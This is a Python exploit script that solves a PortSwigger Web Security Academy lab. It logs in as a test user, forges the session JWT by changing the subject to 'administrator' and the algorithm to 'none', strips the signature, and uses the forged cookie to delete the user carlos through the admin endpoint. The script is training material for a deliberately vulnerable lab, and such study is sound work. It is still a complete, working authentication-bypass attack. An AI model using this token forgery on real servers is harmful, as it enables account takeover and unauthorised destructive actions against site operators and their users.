#!/usr/bin/env python3
# JWT authentication bypass via flawed signature verification
# Lab-Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import base64
import json
import jwt
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    r = client.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def login(client, host, username, password):
    url = f'{host}/login'
    token = get_csrf_token(client, url)
    data = {'csrf': token,
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def manipulate_cookie(client, host):
    def encode(msg):
        return (base64.b64encode(json.dumps(msg).encode('utf-8'))).decode("utf-8")

    cookie = client.cookies.get('session')

    # Use jwt instead of manual base64 decode as the payload may not be padded correctly.
    # jwt deals with this internally so less hassle for me.
    header = jwt.get_unverified_header(cookie)
    payload = jwt.decode(cookie, options={"verify_signature": False})
    payload['sub'] = 'administrator'
    header['alg'] = 'none'

    # Using jwt.encode does not work as none is not supported as algorithm.
    # Pity the documentation (https://pyjwt.readthedocs.io/en/latest/api.html) 
    # does not mention this...
    # encoded = jwt.encode(payload, '', algorithm="None")

    # Re-essamble the cookie manually with the original pieces.
    cookie = f'{encode(header)}.{encode(payload)}.'    
    client.cookies.set('session', cookie, domain=f'{host[8:]}')
    return True


def delete_carlos(client, host):
    url = f'{host}/admin/delete?username=carlos'
    return client.get(url, allow_redirects=False).status_code == 302


def main():
    print('[+] JWT authentication bypass via flawed signature verification')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        if not login(client, host, 'wiener', 'peter'):
            print(f'[-] Failed to log in as wiener')
            sys.exit(-3)
        print(f'[+] Log in as wiener successful')

        if not manipulate_cookie(client, host):
            print(f'[-] Failed to manipulate the cookie to impersonate administrator')
            sys.exit(-4)
        print(f'[+] Cookie manipulated to impersonate administrator')

        if not delete_carlos(client, host):
            print(f'[-] Failed to delete user carlos')
            sys.exit(-5)
        print(f'[+] Deletion of carlos appeared successful')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
